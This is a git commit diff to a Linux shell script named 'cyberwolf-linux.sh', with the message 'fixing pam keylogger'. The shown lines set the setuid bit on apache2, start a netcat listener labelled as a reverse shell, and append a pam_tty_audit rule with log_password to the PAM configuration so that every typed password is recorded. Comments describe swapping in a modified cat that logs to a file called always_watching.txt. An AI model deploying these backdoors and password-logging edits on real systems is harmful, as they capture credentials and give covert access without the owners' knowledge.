7b642d700d23aecb229374ea264eb06cffd76a02
Zach A <>
2023-05-09 00:38:27 -0400

    fixing pam keylogger

--- cyberwolf-linux.sh
+++ cyberwolf-linux.sh
@@ -20,7 +20,7 @@ chmod u+s /usr/sbin/apache2
 #Install reverse shell
 nc -lvp 1337 &
 #Install keylogger :D
-( if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth )
+( exec sh; if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk; sudo touch /tmp/system-auth.bk; sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth; sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth; exit; )
 #Pull modded cat and swap :)
 #Modded cat will append to a file in cyberpup_admin called always_watching.txt
 #Place /usr/bin/keybak so that cat can restore keys
